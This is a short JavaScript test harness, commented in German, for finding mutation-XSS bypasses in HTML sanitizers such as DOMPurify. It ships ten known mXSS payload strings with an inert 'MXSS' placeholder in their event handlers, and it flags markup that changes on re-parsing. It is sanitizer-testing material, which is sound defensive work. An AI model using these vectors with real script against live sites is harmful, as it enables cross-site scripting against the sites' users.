// waf-sanitizer-playbook — mxss-harness.js (v2)
// In/Out-Diff-Harness fuer mXSS-Tests. Im Seitenkontext ausfuehren.
// __mxssStart()              -> Starter-Vektorsatz anzeigen
// __mxssTest(payloads[,fn])  -> Testlauf; fn optional, z. B. (x) => DOMPurify.sanitize(x)
// Rueckgabe: Array mit { input, sanitized, pass1, pass2, mutated }. Mutation manuell pruefen.

(() => {
  if (window.__mxssHarnessInstalled) return 'already installed';
  window.__mxssHarnessInstalled = true;

  window.__MXSS_STARTER = [
    '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=MXSS>',
    '<svg></p><style><a id="</style><img src=x onerror=MXSS>">',
    '<math><annotation-xml encoding="text/html"><img src=x onerror=MXSS></annotation-xml></math>',
    '<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=MXSS>',
    '<table><svg><style><a id="</style><img src=x onerror=MXSS>">',
    '<table><style><img src=x onerror=MXSS></table>',
    '<style><style/><img src=x onerror=MXSS>',
    '<noscript><p title="</noscript><img src=x onerror=MXSS>">',
    '<a href="&quot; onmouseover=MXSS x=&quot;">x</a>',
    '<svg><foreignObject><img src=x onerror=MXSS></foreignObject></svg>'
  ];

  window.__mxssTest = (payloads, sanitizer) => {
    const results = [];
    for (const p of payloads) {
      let clean = p;
      try { clean = typeof sanitizer === 'function' ? sanitizer(p) : p; } catch (e) { clean = '<sanitizer-threw>'; }
      const host1 = document.createElement('div');
      host1.innerHTML = clean;
      const pass1 = host1.innerHTML;
      const host2 = document.createElement('div');
      host2.innerHTML = pass1;
      const pass2 = host2.innerHTML;
      results.push({ input: p, sanitized: clean, pass1, pass2, mutated: pass1 !== pass2 });
    }
    try {
      console.table(results.map((r) => ({ mutated: r.mutated, input: r.input, pass2: r.pass2 })));
    } catch (e) {}
    return results;
  };

  window.__mxssStart = () => {
    console.log('[mxss-harness] Starter-Vektoren:', window.__MXSS_STARTER.length);
    console.log('Nutzung: __mxssTest(__MXSS_STARTER' +
      (window.DOMPurify ? ', (x) => DOMPurify.sanitize(x)' : '') + ')');
    if (window.DOMPurify) console.log('[mxss-harness] DOMPurify gefunden, Version:', window.DOMPurify.version);
    else console.log('[mxss-harness] Kein DOMPurify im globalen Scope — Sanitizer-Fn ggf. selbst uebergeben.');
    return window.__MXSS_STARTER;
  };

  console.log('[mxss-harness v2] bereit. __mxssStart() | __mxssTest(payloads[, sanitizerFn])');
  return 'installed';
})();
